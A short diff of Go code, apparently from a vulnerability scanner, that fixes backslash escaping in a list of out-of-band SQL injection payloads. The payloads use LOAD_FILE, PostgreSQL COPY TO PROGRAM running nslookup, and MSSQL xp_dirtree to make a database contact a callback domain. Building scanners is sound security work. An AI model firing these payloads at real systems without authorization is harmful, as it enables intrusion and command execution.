@@ -250,7 +250,7 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				oobPayloads := []string{
 					fmt.Sprintf("' AND 1=LOAD_FILE('\\\\\\\\%s\\\\a')-- -", oobDomain),
 					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
-					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s\\a'-- -", oobDomain),
+					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", oobDomain),
 				}
 
 				for _, op := range oobPayloads {
